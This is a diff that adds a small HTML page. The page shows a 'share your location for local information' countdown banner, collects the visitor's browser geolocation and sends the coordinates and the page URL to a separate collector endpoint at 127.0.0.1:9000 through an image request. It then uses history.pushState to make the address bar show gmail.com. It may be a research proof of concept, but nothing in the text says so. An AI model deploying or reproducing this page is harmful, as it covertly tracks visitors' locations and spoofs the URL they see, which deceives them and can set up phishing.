@@ -1,0 +1,79 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
+
+    <style type="text/css">
+     * {
+       margin: 0; 
+       padding: 0;
+     }
+
+     div#banner { 
+       position: absolute; 
+       top: 0; 
+       left: 0; 
+       background-color: #73C976; 
+       width: 100%; 
+     }
+     div#banner-content { 
+       width: 800px; 
+       margin: 0 auto; 
+       padding: 10px; 
+       border: 1px solid #000;
+       text-align: center;
+     }
+     div#main-content { 
+       padding-top: 70px;
+    }
+    </style>
+
+</head>
+<body>
+ <div id="banner">
+    <div id="banner-content">
+    </div>
+  </div>
+  <script>
+
+var banner = document.getElementById("banner-content");
+banner.innerHTML = "Share your location for local information... ";
+var id;
+var counter = 4;
+id = setInterval(function() {
+    counter--;
+    if(counter < 0) {
+        console.log("Share your location for local information...")
+        getLocation();
+        clearInterval(id);
+
+    } else {
+        console.log("Share your location for local information... " + counter.toString())
+        banner.innerHTML = "Share your location for local information... " + counter.toString();
+    }
+}, 1000);
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendPosition);
+    } else { 
+        console.log("Geolocation is not supported by this browser.");
+    }
+}
+
+function sendPosition(position) {   
+    new Image().src = 'http://127.0.0.1:9000/CatchLocation?page='+window.location.href+'&latitude='+    position.coords.latitude.toFixed(2)+'&longitude='+position.coords.longitude.toFixed(2);
+    var pageurl = "http://www.gmail.com";
+    console.log("relocating to: ", pageurl)
+    //to change the browser URL to the given link location
+    if(pageurl!=window.location){
+    window.history.pushState({path:pageurl},'',pageurl);
+    }
+    //stop refreshing to the page given in
+    return false;
+
+}
+  </script>
+</body>
+</html
